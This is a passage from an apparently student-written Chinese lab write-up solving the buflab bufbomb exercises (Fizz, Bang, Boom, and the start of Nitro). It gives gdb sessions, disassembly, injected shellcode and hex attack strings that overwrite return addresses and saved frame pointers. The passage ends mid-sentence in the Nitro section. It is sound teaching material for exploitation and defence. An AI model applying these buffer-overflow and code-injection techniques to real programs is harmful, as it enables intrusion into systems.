class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">一开始申请的40字节</span><br><span class="line">00 00 00 00</span><br><span class="line">test（）的ebp值</span><br><span class="line">e8 8b 04 08</span><br><span class="line">fizz的地址/ebp值</span><br><span class="line">00 00 00 00</span><br><span class="line">c9 a3 6f 67</span><br><span class="line">cookie值</span><br></pre></td></tr></table></figure><p>综上所示，我们就构建出了目标字符串，将目标字符串进行运行，就会显示出结果：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">21</span> <span class="number">23</span>:<span class="number">58</span></span><br><span class="line">zinker &gt;&gt;&gt; cat fizz_in.txt | ./hex2raw -n | ./bufbomb  -u <span class="number">1170300532</span></span><br><span class="line">Userid: <span class="number">1170300532</span></span><br><span class="line">Cookie: <span class="number">0</span>x676fa3c9</span><br><span class="line">Type string:Fizz!: You called fizz(<span class="number">0</span>x676fa3c9)</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure><h1 id="Bang"><a href="#Bang" class="headerlink" title="Bang"></a>Bang</h1><p>​    从这个实验开始，我们真正进入了这次实验最重要的地方，也就是我们需要自己写汇编代码。好的，我们依旧从Bang函数的C语言源码开始：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(global_value == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Bang!: You set global_value to 0x%x\n"</span>, global_value);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: global_value = 0x%x\n"</span>, global_value);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    好的，根据ppt中的提示信息，我们需要构造攻击字符串，使得目标程序调用bang函数，要将全局变量中global_value的值篡改为cookie值，使相应的判断成功。我们需要在缓冲区中注入代码来改变这个全局变量。</p><p>​    那么我们依旧从bang函数的汇编代码开始：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">08048c39 &lt;bang&gt;:</span><br><span class="line"> 8048c39:55                   push   %ebp</span><br><span class="line"> 8048c3a:89 e5                mov    %esp,%ebp</span><br><span class="line"> 8048c3c:83 ec 08             sub    $0x8,%esp</span><br><span class="line"> 8048c3f:a1 60 e1 04 08       mov    0x804e160,%eax</span><br><span class="line"> 8048c44:89 c2                mov    %eax,%edx</span><br><span class="line"> 8048c46:a1 58 e1 04 08       mov    0x804e158,%eax</span><br><span class="line"> 8048c4b:39 c2                cmp    %eax,%edx</span><br><span class="line"> 8048c4d:75 25                jne    8048c74 &lt;bang+0x3b&gt;</span><br><span class="line"> 8048c4f:a1 60 e1 04 08       mov    0x804e160,%eax</span><br><span class="line"> 8048c54:83 ec 08             sub    $0x8,%esp</span><br><span class="line"> 8048c57:50                   push   %eax</span><br><span class="line"> 8048c58:68 1c a5 04 08       push   $0x804a51c</span><br><span class="line"> 8048c5d:e8 1e fc ff ff       call   8048880 &lt;printf@plt&gt;</span><br><span class="line"> 8048c62:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048c65:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 8048c68:6a 02                push   $0x2</span><br><span class="line"> 8048c6a:e8 5c 08 00 00       call   80494cb &lt;validate&gt;</span><br><span class="line"> 8048c6f:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048c72:eb 16                jmp    8048c8a &lt;bang+0x51&gt;</span><br><span class="line"> 8048c74:a1 60 e1 04 08       mov    0x804e160,%eax</span><br><span class="line"> 8048c79:83 ec 08             sub    $0x8,%esp</span><br><span class="line"> 8048c7c:50                   push   %eax</span><br><span class="line"> 8048c7d:68 41 a5 04 08       push   $0x804a541</span><br><span class="line"> 8048c82:e8 f9 fb ff ff       call   8048880 &lt;printf@plt&gt;</span><br><span class="line"> 8048c87:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048c8a:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 8048c8d:6a 00                push   $0x0</span><br><span class="line"> 8048c8f:e8 dc fc ff ff       call   8048970 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>首先我们的目的很简单，就是找到全局变量global_value的地址。那么我们需要利用到一部分的gdb或者cgdb，首先，使用如下的语句：​    </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) file bufbomb</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</span><br><span class="line">(gdb) b test</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0</span>x8048c9a</span><br><span class="line">(gdb) r -u <span class="number">1170300532</span></span><br><span class="line">Starting program: /home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0/bufbomb -u <span class="number">1170300532</span></span><br><span class="line">Userid: <span class="number">1170300532</span></span><br><span class="line">Cookie: <span class="number">0</span>x676fa3c9</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0</span>x08048c9a <span class="keyword">in</span> test ()</span><br><span class="line">(gdb) x/s <span class="number">0</span>x804e160</span><br><span class="line"><span class="number">0</span>x804e160 &lt;global_value&gt;:       <span class="string">""</span>//忽略这个值</span><br><span class="line">(gdb) x/s <span class="number">0</span>x804e158</span><br><span class="line"><span class="number">0</span>x804e158 &lt;cookie&gt;:     <span class="string">"M-IM-#og"</span>//这个值也忽略</span><br></pre></td></tr></table></figure><p>​    我们通过观察bang的汇编代码，会发现bang能够输出我们的cookie的条件取决于cmp的语句，而这个cmp所比较的两个位置经过对前面汇编代码的翻译，我们可以确定是对0x804e160、0x804e158进行比较，也就是说我们需要从这两个位置中确定哪一个是global_value，根据上面在gdb中的调试我们能够确定0x804e160就是我们要找的global_value的地址。</p><p>​    接下来的步骤是这个实验的关键部分，也是在之后的Boom和Nitro中也要使用的环节，自己书写汇编代码。当然，在写代码之前我们必须确定我们的目的是什么，我们是要改变全局变量的值，然后让getbuf这个函数运行bang函数。那么首先我们能够确定的部分是：我们要写什么样的代码。</p><p>​    我们已知的代码片段是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $0x676fa3c9, 0x804e160</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>​    也就是说，我们一定会写出这样的代码，那么问题来了，我们怎么才能调用bang函数呢？有的人可能会想，我们要在函数返回地址处写上bang函数的地址，那样的话就可以调用bang函数，但是这种方法是有问题的，因为它并没有改变全局变量的值，也就是我们写的汇编语句并没有发挥作用。所以我们不能直接在函数返回地址处写bang的地址。这时候，我们就要依靠栈结构去达到我们的目的，也就是利用push语句，去直接转到bang函数。这种方法的基础在于，我们在使用push语句的时候，将地址入栈后ret，就可以立刻进入我们刚刚放到栈中的地址，所以我们最终的汇编代码应该如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x676fa3c9, 0x804e160</span><br><span class="line">push $0x8048c39</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>​    那么，我们应该怎么解决函数返回地址的问题呢？也就是说我们在字符串的返回地址区写点什么呢？首先我们要先找到我们栈顶的位置，</p><p>​    利用gdb，我们找到</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08049378</span> &lt;getbuf&gt;:</span><br><span class="line"> <span class="number">8049378</span>:<span class="number">55</span>                   push   %ebp</span><br><span class="line"> <span class="number">8049379</span>:<span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line"> <span class="number">804937</span>b:<span class="number">83</span> ec <span class="number">28</span>             sub    <span class="variable">$0x28</span>,%esp</span><br><span class="line"> <span class="number">804937</span>e:<span class="number">83</span> ec <span class="number">0</span>c             sub    <span class="variable">$0xc</span>,%esp</span><br><span class="line"> <span class="number">8049381</span>:<span class="number">8</span>d <span class="number">45</span> d8             lea    -<span class="number">0</span>x28(%ebp),%eax</span><br><span class="line"> <span class="number">8049384</span>:<span class="number">50</span>                   push   %eax</span><br><span class="line"> ....</span><br></pre></td></tr></table></figure><p>​    然后利用stepi命令，使程序运行到push，然后查询eax，就可以得到eax的地址，也就使我们栈帧顶的地址</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/x <span class="variable">$eax</span></span><br><span class="line"><span class="number">0</span>x556837a8 &lt;_reserved+<span class="number">1038248</span>&gt;: <span class="number">0</span>x556837d0 // 左边那个</span><br></pre></td></tr></table></figure><p>​    这样我们就确定了我们的栈顶位置，为了简单起见，我们仅将恶意代码注入到栈顶的位置，而不对栈进行修改。紧接着我们开始对我们的恶意代码进行处理，利用如下的语句：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -c asm.s</span><br><span class="line">objdump -d asm.o</span><br></pre></td></tr></table></figure><p>​    我们可以得到如下的显示：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">2</span>:<span class="number">08</span></span><br><span class="line">zinker &gt;&gt;&gt; objdump -d asm.o                                                                                                                 <span class="number">1</span></span><br><span class="line"></span><br><span class="line">asm.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:c7 <span class="number">05</span> <span class="number">60</span> e1 <span class="number">04</span> <span class="number">08</span> c9 movl   <span class="variable">$0x676fa3c9</span>,<span class="number">0</span>x804e160</span><br><span class="line">   <span class="number">7</span>:a3 <span class="number">6</span>f <span class="number">67</span> </span><br><span class="line">   a:<span class="number">68</span> <span class="number">39</span> <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span>       push   <span class="variable">$0x8048c39</span></span><br><span class="line">   f:c3                   ret</span><br></pre></td></tr></table></figure><p>​    而我们需要的就是c7 05这些数字，根据以上的信息我们可以构建字符串了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c7 05 60 e1 《-|</span><br><span class="line">04 08 c9 a3   |</span><br><span class="line">6f 67 68 39   |</span><br><span class="line">8c 04 08 c3   |</span><br><span class="line">汇编代码       |</span><br><span class="line">00 00 00 00   |</span><br><span class="line">00 00 00 00   |</span><br><span class="line">00 00 00 00   |</span><br><span class="line">00 00 00 00   |</span><br><span class="line">00 00 00 00   |</span><br><span class="line">00 00 00 00   |</span><br><span class="line">00 00 00 00   |</span><br><span class="line">a8 37 68 55   |</span><br><span class="line">栈顶位置--------</span><br></pre></td></tr></table></figure><p>​    综上所述，我们构建出了字符串，然后进行运行，得到如下结果：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">2</span>:<span class="number">08</span></span><br><span class="line">zinker &gt;&gt;&gt; cat bang_in.txt | ./hex2raw -n | ./bufbomb  -u <span class="number">1170300532</span></span><br><span class="line">Userid: <span class="number">1170300532</span></span><br><span class="line">Cookie: <span class="number">0</span>x676fa3c9</span><br><span class="line">Type string:Bang!: You set global_value to <span class="number">0</span>x676fa3c9</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure><h1 id="Boom"><a href="#Boom" class="headerlink" title="Boom"></a>Boom</h1><p>​    加油我们马上就要到最后一个了！</p><p>​    第四个实验，Boom。这个实验没有C的原代码，也就是说所有的操作都是在汇编的环境下进行的。这次的boom和前三个实验不同，前三次实验都是使目标程序跳转到特定函数，进而利用exit函数结束目标程序运行，攻击造成的栈帧结构破坏是可接受的。而boom要求被攻击程序能返回到test函数继续执行，也就是说所谓的无感攻击。我们的目的是构造攻击字符串，使得getbuf能返回cookie值到test函数，而不是1。</p><p>​    首先，我们要知道，我们之前的时候都破坏了哪里的栈帧，简单的说，我们将ebp的值进行了强行覆盖，我们把所有的ebp都变成了00 00 00 00，而无感攻击要求不破坏栈帧结构，那么我们首先要确定ebp的值，所以我们使用gdb进行调试。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) file bufbomb</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</span><br><span class="line">(gdb) b getbuf</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0</span>x804937e</span><br><span class="line">(gdb) r -u <span class="number">1170300532</span></span><br><span class="line">Starting program: /home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0/bufbomb -u <span class="number">1170300532</span></span><br><span class="line">Userid: <span class="number">1170300532</span></span><br><span class="line">Cookie: <span class="number">0</span>x676fa3c9</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0</span>x0804937e <span class="keyword">in</span> getbuf ()</span><br><span class="line">(gdb) x/x <span class="variable">$ebp</span></span><br><span class="line"><span class="number">0</span>x556837d0 &lt;_reserved+<span class="number">1038288</span>&gt;: <span class="number">0</span>x556837f0</span><br></pre></td></tr></table></figure><p>​    那么我们就可以确定ebp中存储的内容是0x556837f0，那么我们就确定了两个因素，一个是我们的返回地址，方法和Bang相同，还有一个就是这个ebp。好的接着我们考虑一下我们怎么去更改返回值。</p><p>​    更改返回值的办法很简单，就是更改eax，因为在汇编语言中eax代表着函数的返回值。所以我们接下来要确定的就是我们在自己写的汇编代码ret之后要返回到什么地址。解决这个问题需要我们看test函数，因为顺序是test函数-&gt;getbuf函数，所以我们要先看test函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">08048c94 &lt;test&gt;:</span><br><span class="line"> 8048c94:55                   push   %ebp</span><br><span class="line"> 8048c95:89 e5                mov    %esp,%ebp</span><br><span class="line"> 8048c97:83 ec 18             sub    $0x18,%esp</span><br><span class="line"> 8048c9a:e8 64 04 00 00       call   8049103 &lt;uniqueval&gt;</span><br><span class="line"> 8048c9f:89 45 f0             mov    %eax,-0x10(%ebp)</span><br><span class="line"> 8048ca2:e8 d1 06 00 00       call   8049378 &lt;getbuf&gt;</span><br><span class="line"> 8048ca7:89 45 f4             mov    %eax,-0xc(%ebp)</span><br><span class="line"> .....</span><br></pre></td></tr></table></figure><p> 找到调用getbuf的位置，我们明白了，eax其实只是getbuf的返回值而已，所以我们的最终目标就是在运行getbuf的时候，通过缓冲区溢出，更改返回值为cookie，然后直接跳过getbuf的ret，直接执行0x8048ca7的语句内容，这样就成功修改了getbuf的返回值。所以我们的汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x676fa3c9, %eax</span><br><span class="line">push $0x8048ca7</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>​    紧接着我们开始对我们的恶意代码进行处理，利用如下的语句：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -c asm2.s</span><br><span class="line">objdump -d asm2.o</span><br></pre></td></tr></table></figure><p>​    我们就会看到下面的语句：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">2</span>:<span class="number">58</span></span><br><span class="line">zinker &gt;&gt;&gt; gcc -m32 -c asm2.s                                       </span><br><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">2</span>:<span class="number">59</span></span><br><span class="line">zinker &gt;&gt;&gt; objdump -d asm2.o</span><br><span class="line"></span><br><span class="line">asm2.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:b8 c9 a3 <span class="number">6</span>f <span class="number">67</span>       mov    <span class="variable">$0x676fa3c9</span>,%eax</span><br><span class="line">   <span class="number">5</span>:<span class="number">68</span> a7 <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span>       push   <span class="variable">$0x8048ca7</span></span><br><span class="line">   a:c3                   ret</span><br></pre></td></tr></table></figure><p>然后我们就可以开始构造字符串了，构造的字符串如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b8 c9 a3 6f </span><br><span class="line">67 68 a7 8c</span><br><span class="line">04 08 c3 00 //自己的汇编代码</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">f0 37 68 55//正常的ebp值</span><br><span class="line">a8 37 68 55 //栈顶</span><br></pre></td></tr></table></figure><p>运行之后，得到如下的结果：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">2</span>:<span class="number">59</span></span><br><span class="line">zinker &gt;&gt;&gt; cat boom_in.txt | ./hex2raw -n | ./bufbomb  -u <span class="number">1170300532</span></span><br><span class="line">Userid: <span class="number">1170300532</span></span><br><span class="line">Cookie: <span class="number">0</span>x676fa3c9</span><br><span class="line">Type string:Boom!: getbuf returned <span class="number">0</span>x676fa3c9</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure><p>终于，这基础的4个实验结束了，我们稍微总结一下，我们主要利用的是在缓冲区溢出之后，通过更改返回地址或者参数调用去影响正常的程序，如果希望你的修改能够不被发现，就要尽可能的保持原有的栈帧结构，还有就是汇编语言的书写。真的在这个时候，才觉得自己学的东西真少，应该学的东西太多了。</p><h1 id="Nitro"><a href="#Nitro" class="headerlink" title="Nitro"></a>Nitro</h1><p>​    最后一个！！也是真正挑战开始的时刻，我们要使用-n指令来开启Nitro模式，这样我们才能进行nitro的破解，这次实验中我们所调用的函数将会变成getbufn和testn，区别在于getbufn是将栈帧的地址空间随机化，而getbuf是将栈帧地址固定于一个位置上，所以我们必须要想办法去在随机栈帧的情况下仍然能够达到我们的要求。</p><p>​    那么我们要构造攻击字符串使得getbufn返回cookie给testn函数，同时恢复正确栈帧结构，正确返回到testn函数。值得注意的是，getbufn将会选取5个不同的栈帧地址，而我们要想办法使得每一次都能够正确复原栈帧，并使得程序返回到testn。</p><p>​    那么我们首先先看一下getbufn和testn的汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08049394 &lt;getbufn&gt;:</span><br><span class="line"> 8049394:55                   push   %ebp</span><br><span class="line"> 8049395:89 e5                mov    %esp,%ebp</span><br><span class="line"> 8049397:81 ec 08 02 00 00    sub    $0x208,%esp</span><br><span class="line"> 804939d:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 80493a0:8d 85 f8 fd ff ff    lea    -0x208(%ebp),%eax</span><br><span class="line"> 80493a6:50                   push   %eax</span><br><span class="line"> 80493a7:e8 7c fa ff ff       call   8048e28 &lt;Gets&gt;</span><br><span class="line"> 80493ac:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 80493af:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line"> 80493b4:c9                   leave  </span><br><span class="line"> 80493b5:c3                   ret</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">08048d0e &lt;testn&gt;:</span><br><span class="line"> 8048d0e:55                   push   %ebp</span><br><span class="line"> 8048d0f:89 e5                mov    %esp,%ebp</span><br><span class="line"> 8048d11:83 ec 18             sub    $0x18,%esp</span><br><span class="line"> 8048d14:e8 ea 03 00 00       call   8049103 &lt;uniqueval&gt;</span><br><span class="line"> 8048d19:89 45 f0             mov    %eax,-0x10(%ebp)</span><br><span class="line"> 8048d1c:e8 73 06 00 00       call   8049394 &lt;getbufn&gt;</span><br><span class="line"> 8048d21:89 45 f4             mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048d24:e8 da 03 00 00       call   8049103 &lt;uniqueval&gt;</span><br><span class="line"> 8048d29:89 c2                mov    %eax,%edx</span><br><span class="line"> 8048d2b:8b 45 f0             mov    -0x10(%ebp),%eax</span><br><span class="line"> 8048d2e:39 c2                cmp    %eax,%edx</span><br><span class="line"> 8048d30:74 12                je     8048d44 &lt;testn+0x36&gt;</span><br><span class="line"> 8048d32:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 8048d35:68 60 a5 04 08       push   $0x804a560</span><br><span class="line"> 8048d3a:e8 21 fc ff ff       call   8048960 &lt;puts@plt&gt;</span><br><span class="line"> 8048d3f:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048d42:eb 41                jmp    8048d85 &lt;testn+0x77&gt;</span><br><span class="line"> 8048d44:8b 55 f4             mov    -0xc(%ebp),%edx</span><br><span class="line"> 8048d47:a1 58 e1 04 08       mov    0x804e158,%eax</span><br><span class="line"> 8048d4c:39 c2                cmp    %eax,%edx</span><br><span class="line"> 8048d4e:75 22                jne    8048d72 &lt;testn+0x64&gt;</span><br><span class="line"> 8048d50:83 ec 08             sub    $0x8,%esp</span><br><span class="line"> 8048d53:ff 75 f4             pushl  -0xc(%ebp)</span><br><span class="line"> 8048d56:68 c4 a5 04 08       push   $0x804a5c4</span><br><span class="line"> 8048d5b:e8 20 fb ff ff       call   8048880 &lt;printf@plt&gt;</span><br><span class="line"> 8048d60:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048d63:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 8048d66:6a 04                push   $0x4</span><br><span class="line"> 8048d68:e8 5e 07 00 00       call   80494cb &lt;validate&gt;</span><br><span class="line"> 8048d6d:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048d70:eb 13                jmp    8048d85 &lt;testn+0x77&gt;</span><br><span class="line"> 8048d72:83 ec 08             sub    $0x8,%esp</span><br><span class="line"> 8048d75:ff 75 f4             pushl  -0xc(%ebp)</span><br><span class="line"> 8048d78:68 e4 a5 04 08       push   $0x804a5e4</span><br><span class="line"> 8048d7d:e8 fe fa ff ff       call   8048880 &lt;printf@plt&gt;</span><br><span class="line"> 8048d82:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 8048d85:90                   nop</span><br><span class="line"> 8048d86:c9                   leave  </span><br><span class="line"> 8048d87:c3                   ret</span><br></pre></td></tr></table></figure><p>​    首先我们通过提示和汇编代码，首先我们能够确定的是esp和ebp的关系，也就是根据testn的代码，可以知道ebp = esp + 